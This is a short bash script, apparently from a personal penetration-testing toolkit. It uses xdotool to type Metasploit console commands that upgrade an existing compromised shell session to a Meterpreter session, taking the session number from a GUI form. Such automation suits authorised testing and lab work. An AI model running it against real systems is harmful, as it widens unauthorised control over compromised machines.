#!/bin/bash

: '
meterpreter:  upgrade shell to meterpreter
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "SESSION"

SESSION=${form_data["SESSION"]}

paste_command "use multi/manage/shell_to_meterpreter"
xdotool key Return
sleep 1

paste_command "set SESSION ${SESSION}"
xdotool key Return
sleep 0.8

paste_command "run"
xdotool key Return

